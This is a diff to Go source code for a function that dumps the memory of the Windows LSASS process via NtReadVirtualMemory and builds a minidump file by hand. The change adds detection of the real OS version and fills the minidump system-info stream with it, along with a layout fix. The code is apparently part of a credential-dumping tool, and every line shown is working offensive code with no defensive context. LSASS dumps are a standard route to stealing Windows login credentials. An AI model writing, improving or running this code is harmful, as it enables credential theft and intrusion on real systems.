@@ -1201,6 +1201,25 @@ func lsassDumpNT(lsassPid uint32) ([]byte, error) {
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 	ntReadVM := ntdll.NewProc("NtReadVirtualMemory")
 
+	// detect real OS version via RtlGetVersion (bypasses GetVersionEx compat shim)
+	type osversioninfow struct {
+		dwOSVersionInfoSize uint32
+		dwMajorVersion      uint32
+		dwMinorVersion      uint32
+		dwBuildNumber       uint32
+		dwPlatformId        uint32
+		szCSDVersion        [128]uint16
+	}
+	var osvi osversioninfow
+	osvi.dwOSVersionInfoSize = uint32(unsafe.Sizeof(osvi))
+	rtlGetVersion := ntdll.NewProc("RtlGetVersion")
+	rtlGetVersion.Call(uintptr(unsafe.Pointer(&osvi)))
+	osMajor := osvi.dwMajorVersion
+	if osMajor == 0 { osMajor = 10 }
+	osMinor := osvi.dwMinorVersion
+	osBuild := osvi.dwBuildNumber
+	if osBuild == 0 { osBuild = 19041 }
+
 	if lsassPid == 0 {
 		lsassPid = findProcessPID("lsass.exe")
 		if lsassPid == 0 {
@@ -1269,13 +1288,13 @@ func lsassDumpNT(lsassPid uint32) ([]byte, error) {
 	// Layout:
 	//  0:   MINIDUMP_HEADER (32)
 	//  32:  MINIDUMP_DIRECTORY * 3 (36)
-	//  68:  SystemInfoStream (56)
-	//  124: ModuleListStream = 4 + N*108 bytes + name blobs
+	//  68:  SystemInfoStream (62 = 56 struct + 6 empty MINIDUMP_STRING for CSDVersionRva)
+	//  130: ModuleListStream = 4 + N*108 bytes + name blobs
 	//  X:   Memory64ListStream = 8+8+N*16 bytes
 	//  Y:   raw memory data
 	const (
 		modEntSz   = 108
-		sysInfoSz  = 56
+		sysInfoSz  = 62 // 56-byte struct + 6 zero bytes (empty MINIDUMP_STRING for CSDVersionRva)
 		numStreams  = 3
 	)
 	dirOff     := 32
@@ -1322,10 +1341,12 @@ func lsassDumpNT(lsassPid uint32) ([]byte, error) {
 
 	// SystemInfo
 	si := buf[sysInfoOff:]
-	pu16(si[0:], 9); pu16(si[2:], 6)          // ProcessorArchitecture=AMD64, Level=6
-	si[6] = 1; si[7] = 1                       // NumProcs=1, ProductType=Workstation
-	pu32(si[8:], 10); pu32(si[12:], 0)         // MajorVersion=10, MinorVersion=0
-	pu32(si[16:], 19041); pu32(si[20:], 2)     // BuildNumber=19041, PlatformId=NT
+	pu16(si[0:], 9); pu16(si[2:], 6)                     // ProcessorArchitecture=AMD64, Level=6
+	si[6] = 1; si[7] = 1                                  // NumProcs=1, ProductType=Workstation
+	pu32(si[8:], osMajor); pu32(si[12:], osMinor)         // MajorVersion, MinorVersion
+	pu32(si[16:], osBuild); pu32(si[20:], 2)              // BuildNumber, PlatformId=NT
+	// CSDVersionRva → 6-byte empty MINIDUMP_STRING at sysInfoOff+56 (already zeroed)
+	pu32(si[24:], uint32(sysInfoOff+56))
 
 	// ModuleList
 	ml := buf[modListOff:]
